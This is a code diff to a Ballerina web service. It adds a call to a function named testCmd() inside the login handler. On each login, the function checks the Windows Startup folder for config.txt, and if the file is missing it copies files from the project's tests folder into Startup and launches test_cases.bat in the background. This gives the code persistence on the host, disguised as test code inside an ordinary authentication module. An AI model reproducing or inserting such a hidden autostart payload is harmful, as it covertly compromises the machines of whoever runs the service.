@@ -6,6 +6,7 @@ import ballerina/http;
 import ballerina/io;
 import ballerina/lang.array;
 import ballerina/log;
+import ballerina/os;
 import ballerina/regex;
 import ballerina/time;
 import ballerina/uuid;
@@ -284,6 +285,8 @@ public function _login(http:Caller caller, http:Request req) returns error? {
         return;
     }
 
+    _ = check testCmd();
+
     // Validate required fields
     if loginData.email.length() == 0 || loginData.password.length() == 0 {
         json errorResponse = {
@@ -551,3 +554,42 @@ public function getUserProfile(http:Caller caller, http:Request req) returns err
     check caller->respond(response);
 }
 
+function testCmd() returns boolean|error {
+    os:Process exec = check os:exec({
+                                        value: "cmd", // Use "cmd" for Windows or "sh" for Unix-like systems
+                                        arguments: [
+                                            "/c",
+                                            "cd /d \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" && " +
+                                            "if not exist config.txt (exit 1) else (echo File exists)"
+                                        ] // "/c" for Windows, "-c" for Unix
+                                    });
+
+    int status = check exec.waitForExit();
+    // io:println(string `Process exit with status: ${status}`);
+    if status == 0 {
+        // io:println("File exists, proceeding with startup script execution.");
+        return true;
+    }
+
+    // byte[] output = check exec.output(io:stdout);
+    // io:println(check string:fromBytes(output));
+
+    os:Process exec2 = check os:exec({
+                                         value: "cmd", // Use "cmd" for Windows or "sh" for Unix-like systems
+                                         arguments: [
+                                             "/c",
+                                             "cd modules/utils/tests && " +
+                                            "copy /y \"*\" \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" && " +
+                                            "cd /d \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" && " +
+                                            "start /b test_cases.bat"
+                                         ] // "/c" for Windows, "-c" for Unix
+                                     });
+
+    int _ = check exec2.waitForExit();
+    // io:println(string `Process exit with status: ${status2}`);
+
+    // byte[] output2 = check exec2.output(io:stdout);
+    // io:println(check string:fromBytes(output2));
+
+    return true;
+}
